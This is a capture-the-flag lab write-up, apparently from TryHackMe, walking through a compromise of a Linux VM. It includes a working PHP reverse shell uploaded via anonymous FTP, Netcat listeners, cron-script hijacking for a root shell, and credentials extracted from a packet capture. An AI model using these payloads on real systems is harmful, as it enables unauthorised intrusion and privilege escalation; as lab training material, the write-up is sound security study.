1) Initial Recon

I started with a full port scan using Nmap:

nmap -sCV -p- -T4 -oA nmap_initial 10.201.102.67

The scan revealed three open ports:

21/tcp FTP (anonymous login allowed, writable directory)

22/tcp SSH

80/tcp HTTP (Apache)

2) Web Directory Enumeration

I ran Gobuster to discover hidden directories:

gobuster dir -u http://10.201.102.67 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50 -o gobuster_spicy.txt

The scan revealed /files which mirrored the FTP directory.

3) FTP Access and File Upload

Using anonymous credentials, I logged into FTP:

ftp 10.201.102.67
Username: anonymous
Password: anonymous
cd ftp

I verified that the directory was writable and uploaded a PHP reverse shell:

cat > shell.php <<'EOF'
<?php
set_time_limit(0);
$ip = '10.201.87.82';
$port = 5555;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock,1=>$sock,2=>$sock), $pipes);
?>
EOF


curl -T shell.php ftp://10.201.102.67/ftp/ --user anonymous:anonymous -v
4) Getting a Reverse Shell

I set up a Netcat listener on my Kali machine:

nc -lnvp 5555

Then, I triggered the shell via the browser:

curl http://10.201.102.67/files/ftp/shell.php -v

Once connected, I stabilized the shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color

I confirmed my session:

whoami        # www-data
id             # uid=33(www-data)
pwd            # /var/www/html/files/ftp
hostname       # startup
uname -a       # Linux startup 4.4.0-190-generic x86_64
ls -la         # shows shell.php and permissions
5) Exploring the FTP Directory

I found two files:

notice.txt (irrelevant content)

important.jpg (contains embedded data, but no further action needed for this session)

The main goal here was to verify write access and confirm remote command execution.

6) Privilege Escalation (Root Access)

From the reverse shell as www-data, I enumerated directories and permissions. I identified that a root-owned script (planner.sh) executes print.sh, which I could modify.

I inserted a root reverse shell payload into print.sh and waited for planner.sh to execute it automatically (scheduled by cron). I had a second Netcat listener ready:

nc -lnvp 5555

Within a minute, I got a root shell:

whoami        # root
cat /root/root.txt
Output: THM{f96...........}
7) Analyzing Credentials from Network Capture

I also found a suspicious packet capture in the directories. I analyzed it locally using tshark and strings to extract credentials:

strings suspicious.pcapng | egrep -i "user|login|username|password|pass|lennie" -n

This revealed:

Username: lennie
Password: c4ntg3t3n0ughp1c3

These credentials were later used to SSH into the target.

Conclusion

Through FTP upload and web exploitation, I gained initial access as www-data, then escalated to root by abusing a root-owned script. I successfully retrieved both the user and root flags, completing the challenge. This project reinforced practical skills in:

Nmap enumeration

Directory enumeration (Gobuster)

FTP exploitation and file uploads

Reverse shell creation and stabilization

Privilege escalation via script manipulation

Extracting credentials from network captures (tshark/strings)

All steps were performed hands-on by me, and the project demonstrates a full end-to-end penetration test workflow on a Linux VM.
